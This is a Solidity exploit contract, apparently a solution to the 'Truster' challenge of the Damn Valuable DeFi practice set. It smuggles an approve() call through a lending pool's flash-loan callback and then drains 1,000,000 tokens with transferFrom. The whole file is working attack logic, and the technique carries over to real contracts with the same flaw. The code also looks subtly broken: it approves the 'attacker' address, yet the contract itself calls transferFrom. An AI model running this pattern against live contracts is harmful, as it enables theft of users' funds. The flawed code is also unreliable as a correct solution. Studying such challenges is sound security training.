// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./TrusterLenderPool.sol";
import "./DamnValuableToken.sol";

contract TrusterExploit {
    function attack(
        address poolAddr,
        address tokenAddr,
        address attacker,
        address recoveryAddr
    ) external {
        TrusterLenderPool pool = TrusterLenderPool(poolAddr);
        DamnValuableToken token = DamnValuableToken(tokenAddr);

        // Encode the `approve()` call to approve the attacker to spend 1M tokens
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            1_000_000 ether
        );

        // Call the poolâ€™s flashLoan with 0 tokens but include malicious `approve` payload
        pool.flashLoan(0, attacker, tokenAddr, data);

        // Now attacker has allowance to drain the pool
        token.transferFrom(poolAddr, recoveryAddr, 1_000_000 ether);
    }
}
